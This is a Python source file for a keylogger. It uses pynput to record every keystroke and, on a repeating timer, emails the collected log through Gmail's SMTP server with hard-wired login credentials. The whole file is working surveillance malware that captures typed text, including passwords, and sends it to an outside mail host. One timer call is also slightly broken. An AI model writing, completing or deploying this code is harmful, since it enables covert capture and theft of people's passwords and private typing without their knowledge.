import smtplib
import threading
from pynput import mouse, keyboard


"""
Pynput: This library allows you to control and monitor input devices.
smtplib: 
threading: 
"""




class KeyLogger:
    """This class is responsible for parameters"""
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger has started..."
        self.email = email
        self.password = password




    def append_to_log(self, string):
        """This method get the keystrokes and append"""
        self.log = self.log + string




    def on_press(self, key):
        """This method is responsible for creating the key logger"""
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)




    def send_mail(self, email, password, message):
        """Create underlying back structure which will publish emails"""
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    


    def report_n_send(self):
        """This method create Report & Send Email"""
        send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start(send_off)




    def start(self):
        """This method start keylogger and send off emails"""
        keyboard_listener = keyboard.Listener(on_press = self.on_press)
        with keyboard_listener:
            self.report_n_send()
            keyboard_listener.join()
